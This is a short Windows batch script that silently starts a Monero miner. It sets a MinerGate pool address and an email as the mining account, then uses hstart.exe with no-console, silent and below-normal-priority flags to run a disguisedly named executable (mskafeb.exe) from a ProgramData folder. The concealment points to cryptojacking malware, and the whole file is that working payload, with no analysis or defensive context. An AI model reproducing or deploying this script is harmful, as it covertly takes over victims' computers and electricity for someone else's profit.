@echo off

set minuser=oliverafa@gmail.com
set minurl=stratum+tcp://xmr.pool.minergate.com:45560

start C:\ProgramData\mskfea\Hstart\hstart.exe /NOCONSOLE /SILENT /D="C:\ProgramData\mskfea\mskafeb\" /BELOWNORMAL ""C:\ProgramData\mskfea\mskafeb\mskafeb.exe" -D -a cryptonight -o %minurl% -u %minuser% -p x"
